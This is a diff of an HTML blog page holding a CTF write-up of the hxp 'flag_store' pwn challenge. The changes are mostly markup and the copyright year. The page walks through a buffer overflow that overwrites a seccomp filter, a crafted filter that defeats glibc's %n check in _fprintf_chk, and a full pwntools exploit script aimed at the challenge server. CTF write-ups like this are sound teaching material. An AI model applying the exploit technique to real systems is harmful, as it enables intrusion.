@@ -307,7 +307,7 @@
 
 <p>The program will read a secret string from “secret.txt” and store the string address on stack. Then it will use seccomp to create a whitelist of syscalls. We can analyze the filter by using <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> line  CODE  JT   JF      K
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> line  CODE  JT   JF      K
 =================================
  0000: 0x20 0x00 0x00 0x00000004  A = arch
  0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
@@ -326,7 +326,7 @@
  0014: 0x06 0x00 0x00 0x00000000  return KILL
 </code></pre></div></div>
 
-<p>So now the program are only allowed to use the following system calls: <code class="highlighter-rouge">exit</code>, <code class="highlighter-rouge">read</code>, <code class="highlighter-rouge">write</code>, <code class="highlighter-rouge">open</code> and <code class="highlighter-rouge">close</code>.</p>
+<p>So now the program are only allowed to use the following system calls: <code class="language-plaintext highlighter-rouge">exit</code>, <code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">write</code>, <code class="language-plaintext highlighter-rouge">open</code> and <code class="language-plaintext highlighter-rouge">close</code>.</p>
 
 <p>After that the program will do the following ( pseudo code ) :</p>
 
@@ -334,11 +334,11 @@
 <span class="kt">int</span> <span class="n">has_seccomp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="k">while</span> <span class="p">(</span><span class="n">cnt</span><span class="o">--</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mi">96</span><span class="p">);</span> <span class="c1">// read user input
-</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">has_seccomp</span><span class="p">)</span> <span class="n">init_seccomp</span><span class="p">();</span> <span class="c1">// set up seccomp rule
-</span>    <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="c1">// check if input == secret_string
-</span>    <span class="p">{</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mi">96</span><span class="p">);</span> <span class="c1">// read user input</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">has_seccomp</span><span class="p">)</span> <span class="n">init_seccomp</span><span class="p">();</span> <span class="c1">// set up seccomp rule</span>
+    <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="c1">// check if input == secret_string</span>
+    <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">i</span> <span class="p">)</span>
             <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
         <span class="k">if</span> <span class="p">(</span> <span class="n">secret_string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
@@ -346,35 +346,35 @@
     <span class="p">}</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">"Wrong secret :/"</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">==</span> <span class="n">i</span> <span class="p">)</span>
-<span class="n">LABEL_19</span><span class="o">:</span>
-        <span class="n">openflag</span><span class="p">();</span> <span class="c1">// input == secret_string, open flag.txt and print it to stdout
-</span>    <span class="n">_fprintf_chk</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span> <span class="c1">// &lt;-- format string vuln
-</span>    <span class="n">has_seccomp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nl">LABEL_19:</span>
+        <span class="n">openflag</span><span class="p">();</span> <span class="c1">// input == secret_string, open flag.txt and print it to stdout</span>
+    <span class="n">_fprintf_chk</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span> <span class="c1">// &lt;-- format string vuln</span>
+    <span class="n">has_seccomp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>We can spot a format string vulnerability @ line 19. Although the secret string’s address is stored on stack, however the output of <code class="highlighter-rouge">_fprintf_chk</code> is set to stderr, so we can’t use <code class="highlighter-rouge">%s</code> to leak the secret string.</p>
+<p>We can spot a format string vulnerability @ line 19. Although the secret string’s address is stored on stack, however the output of <code class="language-plaintext highlighter-rouge">_fprintf_chk</code> is set to stderr, so we can’t use <code class="language-plaintext highlighter-rouge">%s</code> to leak the secret string.</p>
 
 <p>But there’s still one way to bypass the check. At line 16:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">==</span> <span class="n">i</span> <span class="p">)</span>
 <span class="n">LABEL_19</span><span class="o">:</span>
-        <span class="n">openflag</span><span class="p">();</span> <span class="c1">// input == secret_string, open flag.txt and print it to stdout
-</span></code></pre></div></div>
+        <span class="n">openflag</span><span class="p">();</span> <span class="c1">// input == secret_string, open flag.txt and print it to stdout</span>
+</code></pre></div></div>
 
-<p>If we can overwrite the first character of the secret string to a null byte, and input a random string, both <code class="highlighter-rouge">strlen(secret_string)</code> and <code class="highlighter-rouge">i</code> will be <code class="highlighter-rouge">0</code>, thus bypass the check and will print out the flag.</p>
+<p>If we can overwrite the first character of the secret string to a null byte, and input a random string, both <code class="language-plaintext highlighter-rouge">strlen(secret_string)</code> and <code class="language-plaintext highlighter-rouge">i</code> will be <code class="language-plaintext highlighter-rouge">0</code>, thus bypass the check and will print out the flag.</p>
 
-<p>However this will require us to use the <code class="highlighter-rouge">%n</code> format string payload – which in this case will be blocked by the seccomp filter:</p>
+<p>However this will require us to use the <code class="language-plaintext highlighter-rouge">%n</code> format string payload – which in this case will be blocked by the seccomp filter:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./flag_store
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./flag_store
 %n
 Wrong secret :/
 [1]    5295 invalid system call  ./flag_store
 </code></pre></div></div>
 
-<p>Fortunately my teammate found that there’s a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the <code class="highlighter-rouge">%n</code> character:</p>
+<p>Fortunately my teammate found that there’s a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the <code class="language-plaintext highlighter-rouge">%n</code> character:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending null bytes
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending null bytes
 [*] Sending fmt payload
 [*] Switching to interactive mode
 Wrong secret :/
@@ -383,7 +383,7 @@ Wrong secret :/
 [*] Got EOF while reading in interactive
 </code></pre></div></div>
 
-<p>OK, so we successfully overwrite the seccomp rule, but still the <code class="highlighter-rouge">%n</code> payload was blocked by <code class="highlighter-rouge">_fprintf_chk</code>, which is a more secure version of <code class="highlighter-rouge">fprintf</code>. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.</p>
+<p>OK, so we successfully overwrite the seccomp rule, but still the <code class="language-plaintext highlighter-rouge">%n</code> payload was blocked by <code class="language-plaintext highlighter-rouge">_fprintf_chk</code>, which is a more secure version of <code class="language-plaintext highlighter-rouge">fprintf</code>. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.</p>
 
 <p>And so I started reading the <a href="https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#__readonly_area">glibc source code</a>:</p>
 
@@ -397,10 +397,10 @@ Wrong secret :/
     <span class="p">}</span>                                                                      \
   <span class="k">if</span> <span class="p">(</span><span class="n">readonly_format</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>                                              \
     <span class="n">__libc_fatal</span> <span class="p">(</span><span class="s">"*** %n in writable segment detected ***</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>              \
-<span class="p">}</span>  
+<span class="err">}</span>  
 </code></pre></div></div>
 
-<p>Hmmmm, looks like we’ll have to make <code class="highlighter-rouge">readonly_format &gt;= 0</code> so it won’t call <code class="highlighter-rouge">__libc_fatal ("*** %n in writable segment detected ***\n");</code>. Let’s trace into the <a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area">__readonly_area() function</a>:</p>
+<p>Hmmmm, looks like we’ll have to make <code class="language-plaintext highlighter-rouge">readonly_format &gt;= 0</code> so it won’t call <code class="language-plaintext highlighter-rouge">__libc_fatal ("*** %n in writable segment detected ***\n");</code>. Let’s trace into the <a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area">__readonly_area() function</a>:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__readonly_area</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
 <span class="p">{</span>
@@ -424,11 +424,11 @@ Wrong secret :/
     <span class="p">...................</span>
 </code></pre></div></div>
 
-<p>Ah ha ! We can see that <code class="highlighter-rouge">__readonly_area</code> will call <code class="highlighter-rouge">fopen()</code>, and see if its <code class="highlighter-rouge">errno</code> is equals to <code class="highlighter-rouge">EACCES</code> or <code class="highlighter-rouge">ENOENT</code>. <strong>If so, it will return 1</strong> !! Since we can write our own seccomp rule, we can totally make this happen !</p>
+<p>Ah ha ! We can see that <code class="language-plaintext highlighter-rouge">__readonly_area</code> will call <code class="language-plaintext highlighter-rouge">fopen()</code>, and see if its <code class="language-plaintext highlighter-rouge">errno</code> is equals to <code class="language-plaintext highlighter-rouge">EACCES</code> or <code class="language-plaintext highlighter-rouge">ENOENT</code>. <strong>If so, it will return 1</strong> !! Since we can write our own seccomp rule, we can totally make this happen !</p>
 
 <p>So first we create our own seccomp rule:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># # check if arch is X86_64
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># # check if arch is X86_64
 A = arch
 A == 0xc000003e ? next : ok
 A = sys_number
@@ -441,11 +441,11 @@ ok:
 return ALLOW
 </code></pre></div></div>
 
-<p>Notice that in order to make <code class="highlighter-rouge">open("flag.txt", 0x80000)</code> ( in the <code class="highlighter-rouge">openflag()</code> function ) works normally, we’ll have to add the rule <code class="highlighter-rouge">A == 0x1b6 ? magic : ok</code>. This indicates that if the 3rd argument of <code class="highlighter-rouge">open()</code> equals to <code class="highlighter-rouge">0x1b6</code>, return <code class="highlighter-rouge">ERRNO(13)</code>, otherwise allow the system call. I wrote this rule because I found that when <code class="highlighter-rouge">__readonly_area()</code> calls <code class="highlighter-rouge">fopen ("/proc/self/maps", "rce");</code>, the 3rd argument of <code class="highlighter-rouge">open()</code> was exactly <code class="highlighter-rouge">0x1b6</code>.</p>
+<p>Notice that in order to make <code class="language-plaintext highlighter-rouge">open("flag.txt", 0x80000)</code> ( in the <code class="language-plaintext highlighter-rouge">openflag()</code> function ) works normally, we’ll have to add the rule <code class="language-plaintext highlighter-rouge">A == 0x1b6 ? magic : ok</code>. This indicates that if the 3rd argument of <code class="language-plaintext highlighter-rouge">open()</code> equals to <code class="language-plaintext highlighter-rouge">0x1b6</code>, return <code class="language-plaintext highlighter-rouge">ERRNO(13)</code>, otherwise allow the system call. I wrote this rule because I found that when <code class="language-plaintext highlighter-rouge">__readonly_area()</code> calls <code class="language-plaintext highlighter-rouge">fopen ("/proc/self/maps", "rce");</code>, the 3rd argument of <code class="language-plaintext highlighter-rouge">open()</code> was exactly <code class="language-plaintext highlighter-rouge">0x1b6</code>.</p>
 
 <p>By using the <a href="https://github.com/david942j/seccomp-tools#asm">asm</a> feature of the seccomp-tools, we can generate the raw bytes of our seccomp rule:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ./rule 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ./rule 
 # # check if arch is X86_64
 A = arch
 A == 0xc000003e ? next : ok
@@ -465,33 +465,33 @@ $ seccomp-tools asm ./rule
 
 <p>At last we apply our seccomp rule, exploit the format string vulnerability to bypass the check and get the flag:</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
-<span class="c"># from brucepwn import *</span>
-
+<span class="c1"># from brucepwn import *
+</span>
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"35.198.105.104"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">10000</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./flag_store"</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">LIBC_PATH</span> <span class="k">else</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">LIBC_PATH</span> <span class="k">else</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 <span class="k">if</span> <span class="ow">not</span> <span class="n">libc</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s">"Failed to load libc"</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = elf.process() # elf.process(argv=[argv1, argv2,...])</span>
-
+    <span class="c1">#r = elf.process() # elf.process(argv=[argv1, argv2,...])
+</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mh">0x20</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="s">" </span><span class="se">\x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05</span><span class="s">&gt;</span><span class="se">\x00\x00\xC0</span><span class="s"> </span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00</span><span class="s"> </span><span class="se">\x00\x00\x00</span><span class="s"> </span><span class="se">\x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F</span><span class="s">"</span>
     <span class="k">print</span> <span class="s">"len:"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -506,7 +506,7 @@ $ seccomp-tools asm ./rule
 
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}</code></p>
 
 <p>First blood on this one ! WOOHOO ! 😎</p>
 
@@ -621,7 +621,6 @@ $ seccomp-tools asm ./rule
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -641,7 +640,6 @@ $ seccomp-tools asm ./rule
 
         
           
-          
 
 
 
@@ -660,7 +658,6 @@ $ seccomp-tools asm ./rule
 </div>
 
         
-          
           
 
 
@@ -683,7 +680,6 @@ $ seccomp-tools asm ./rule
 
         
           
-          
 
 
 
@@ -704,6 +700,7 @@ $ seccomp-tools asm ./rule
         
       </div>
     </div>
+  
   
 </div>
 
@@ -754,7 +751,7 @@ $ seccomp-tools asm ./rule
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
